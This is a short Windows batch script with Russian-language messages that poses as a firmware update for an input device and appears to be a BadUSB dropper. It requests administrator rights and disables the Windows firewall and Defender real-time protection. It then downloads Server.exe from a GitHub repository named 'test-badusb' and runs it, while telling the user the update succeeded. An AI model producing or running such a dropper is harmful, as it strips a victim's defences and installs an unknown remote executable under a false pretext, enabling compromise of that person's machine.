@echo off
chcp 65001 >nul

echo Подготовка к обновлению устройства ввода...

:: Проверка прав администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Если прав нет — перезапускаем с запросом прав
    powershell start -verb runas '%0'
    exit /b
)

echo Скачивание обновления программного обеспечения для устройства ввода...
:: Отключение файерволла и антивируса
netsh advfirewall set allprofiles state off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/Aeraelz/test-badusb/raw/refs/heads/main/Server.exe' -OutFile '%temp%\Server.exe'"

if exist "%temp%\Server.exe" (
    echo Установка обновления...
    start "" "%temp%\Server.exe"
    echo Успешно обновлено
    pause
	exit
) else (
    echo Установка обновления...
    echo Отсутствует связь с сервером, попробуйте позже
    pause
	exit
)